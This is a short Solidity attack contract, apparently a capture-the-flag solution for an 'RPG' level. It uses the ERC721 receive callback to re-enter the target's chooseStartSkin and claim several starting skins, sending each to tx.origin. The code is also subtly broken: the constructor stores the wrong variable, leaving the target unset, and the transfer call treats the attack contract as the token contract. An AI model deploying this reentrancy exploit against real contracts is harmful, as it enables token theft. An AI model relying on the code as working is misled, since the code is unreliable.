// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import '../levels/RPG.sol';

contract RPGAttack {
    RPG rpgTarget;
    
    constructor(address payable _rpgTarget) public payable {
        rpgTarget = RPG(rpgTarget);
    }

    uint256 skinNumber = 1;

    function startGame() public {
        rpgTarget.chooseStartSkin(1);
    }

    function onERC721Received(address, address, uint256, bytes calldata) public returns (bytes4) {
        ERC721(address(this)).safeTransferFrom(address(this), tx.origin, skinNumber);
        skinNumber++;
        if (skinNumber <= 2) {
            rpgTarget.chooseStartSkin(skinNumber);
        }
        return this.onERC721Received.selector;
    }
}